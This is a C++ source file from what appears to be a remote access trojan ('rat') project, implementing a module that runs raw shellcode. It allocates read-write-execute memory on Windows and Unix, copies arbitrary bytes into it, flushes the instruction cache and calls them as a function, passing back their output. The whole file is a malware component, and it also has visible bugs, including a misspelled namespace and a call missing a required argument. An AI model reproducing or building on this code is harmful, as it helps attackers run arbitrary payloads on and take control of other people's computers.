#include "rat/payload/rawdogger.hpp"
#include <vector>
#include <string>
#include <stdexcept>
#include <cstring>
#include <functional>

#include "logging.hpp"
// Platform-specific headers
#if defined(_WIN32)
    #include <windows.h>
#else
    #include <sys/mman.h>
    #include <unistd.h>
#endif

#ifdef DEBUG
#include "logging.hpp"
#endif

namespace rat::paylaod::rawdogger {

bool allocateExecutableBuffer(size_t arg_Size, void** p2_Buffer) {
    if (arg_Size == 0) {
        return false;
    }

#if defined(_WIN32)
    void* p_buffer = VirtualAlloc(NULL, arg_Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (p_buffer == NULL) {
        ERROR_LOG("In function rat::payload::rawdogger::allocateExecutableBuffer, failed to allocate executable buffer");
        return false;
    }
#else
    
  void* p_buffer = mmap(NULL, arg_Size, PROT_READ | PROT_WRITE | PROT_EXEC,
                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (p_buffer == MAP_FAILED) {
      
      ERROR_LOG("In function rat::payload::rawdogger::allocateExecutableBuffer, failed to allocate executable buffer");
      return false;
  }
#endif

    *p2_Buffer = p_buffer;
    return true;
}

bool releaseExecutableBuffer(void* p_Buffer, size_t arg_Size) noexcept {
    if (p_Buffer == nullptr) {
        
        ERROR_LOG("In function rat::payload::rawdogger::releaseExecutableBuffer, trying to release null buffer");
        return false;
    }
#if defined(_WIN32)
    VirtualFree(p_Buffer, 0, MEM_RELEASE);
#else
    munmap(p_Buffer, arg_Size);
#endif
    return true;
}

bool flushInstructionCache(void* p_Buffer, size_t arg_Size) {
    if (p_Buffer == nullptr || arg_Size == 0) {
        
        ERROR_LOG("In function rat::payload::rawdogger::flushInstructionCache, flushing a nullptr buffer");
        return false;
    }

#if defined(_WIN32)
    FlushInstructionCache(GetCurrentProcess(), p_Buffer, arg_Size);
    return true;
#elif defined(__APPLE__)
    sys_icache_invalidate(p_Buffer, arg_Size);
    return true;
#elif defined(__linux__)
    __builtin___clear_cache(reinterpret_cast<char*>(p_Buffer),
                              reinterpret_cast<char*>(p_Buffer) + arg_Size);
    return true;
#endif
}

bool copyToExecutableBuffer(void* p_Exec_Buffer, const uint8_t* p_Code, size_t arg_Size) {
    if (p_Exec_Buffer == nullptr || p_Code == nullptr || arg_Size == 0) {
        
        ERROR_LOG("In function rat::payload::rawdogger::copyToExecutableBuffer, failed to allocate executable buffer");
        return false;
    }
    try{
        std::memcpy(p_Exec_Buffer, p_Code, arg_Size);
    }catch(const std::exception& e) {

        ERROR_LOG("In function rat::payload::rawdogger::allocateExecutableBuffer: error {}", e.what());
    }
    return true;
}

    using ExecFunction = void (*)(const std::vector<std::string>&, std::string&);

bool executeWithCleanup(void* p_Exec_Buffer, size_t Buffer_Size,
                          const std::vector<std::string>& arg_Params,
                          std::string& Response_Buffer,
                          const std::function<void()>& Pre_Exec_Checks) {
    if (Pre_Exec_Checks) {
        Pre_Exec_Checks();
    }

    auto func = reinterpret_cast<ExecFunction>(p_Exec_Buffer);
    try {
        func(arg_Params, Response_Buffer);
        return true;
    } catch (...) {
        releaseExecutableBuffer(p_Exec_Buffer, Buffer_Size);
        return false;
      }
    }

bool rawByteExecute(uint8_t* Byte_Code, size_t Number_Bytes,
                       const std::vector<std::string>& arg_Parameters,
                       std::string& Response_Buffer) {
  if (Byte_Code == nullptr || Number_Bytes == 0) {
      return false;
  }
        // Allocate executable memory
  void* exec_buffer = nullptr;
  bool is_buffer_alocated = allocateExecutableBuffer(Number_Bytes, &exec_buffer);
        
  try {
  // Copy code to executable buffer
      copyToExecutableBuffer(exec_buffer, Byte_Code, Number_Bytes);
            
      // Ensure instructions are properly cached
      flushInstructionCache(exec_buffer, Number_Bytes);
            
      // Execute with automatic cleanup
      executeWithCleanup(exec_buffer, Number_Bytes, arg_Parameters, Response_Buffer);
            
      // Release memory
      releaseExecutableBuffer(exec_buffer, Number_Bytes);
      return true;
  } catch (const std::exception& e) {
  // Ensure memory is released if anything fails
  releaseExecutableBuffer(exec_buffer, Number_Bytes);
  ERROR_LOG(e.what());
  return false;      
  }
}

}//rat::payload::rawdogger

